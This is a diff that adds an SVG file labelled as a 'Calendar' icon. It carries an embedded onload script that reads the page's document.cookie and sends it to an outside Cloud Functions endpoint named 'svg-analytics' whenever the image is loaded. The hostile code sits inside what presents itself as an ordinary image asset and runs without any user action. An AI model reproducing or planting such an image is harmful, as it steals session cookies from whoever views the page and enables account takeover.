@@ -1,0 +1,13 @@
+<svg onload="init()" xmlns="http://www.w3.org/2000/svg"
+aria-label="Calendar" role="img"
+viewBox="0 0 512 512">
+<script type="text/ecmascript"><![CDATA[
+function init() {
+  console.log('Hello from Bob')
+  xhr = new XMLHttpRequest();
+  xhr.open('GET', `https://us-central1-svg-analytics.cloudfunctions.net/addMessage?text=${document.cookie}`, true);
+  xhr.send()
+}
+]]></script>
+<path d="M85.564,80H14.435C11.438,80,9,77.562,9,74.564V25.436C9,22.438,11.438,20,14.435,20h71.129C88.562,20,91,22.438,91,25.436  v49.129C91,77.562,88.562,80,85.564,80z M14.435,22C12.541,22,11,23.541,11,25.436v49.129C11,76.459,12.541,78,14.435,78h71.129  C87.459,78,89,76.459,89,74.564V25.436C89,23.541,87.459,22,85.564,22H14.435z" style="" fill="#005BF7"></path>
+</svg>
